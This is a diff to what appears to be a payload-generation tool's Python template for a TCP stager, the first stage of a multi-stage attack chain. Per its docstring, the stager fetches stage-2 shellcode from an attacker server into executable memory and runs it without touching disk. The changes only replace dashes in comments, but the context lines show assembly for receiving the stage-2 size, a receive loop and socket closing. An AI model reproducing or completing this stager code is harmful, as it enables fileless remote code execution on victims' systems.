@@ -1,4 +1,4 @@
-"""TCP stager payload template — stage 1 of a multi-stage chain.
+"""TCP stager payload template - stage 1 of a multi-stage chain.
 
 Downloads stage 2 shellcode from the attacker server into executable memory
 and transfers control to it. Never touches disk.
@@ -103,7 +103,7 @@ class TcpStagerTemplate(PayloadTemplate):
             *safe_push_mem("ebp", sock_h_off, bc),
             *safe_call_mem("ebp", conn_off, bc),
             "",
-            "    ; recv(socket, &bytes_total, 4, 0) — read stage-2 size",
+            "    ; recv(socket, &bytes_total, 4, 0) - read stage-2 size",
             "    xor  eax, eax",
             *safe_lea("ecx", "ebp", bytes_total_off, bc),
             "    push eax",
@@ -146,7 +146,7 @@ class TcpStagerTemplate(PayloadTemplate):
             "    jl   stage1_recv_loop",
             "",
             "stage1_recv_done:",
-            "    ; closesocket — stage 2 opens its own connection if needed",
+            "    ; closesocket - stage 2 opens its own connection if needed",
             *safe_push_mem("ebp", sock_h_off, bc),
             *safe_call_mem("ebp", closesk_off, bc),
             "",
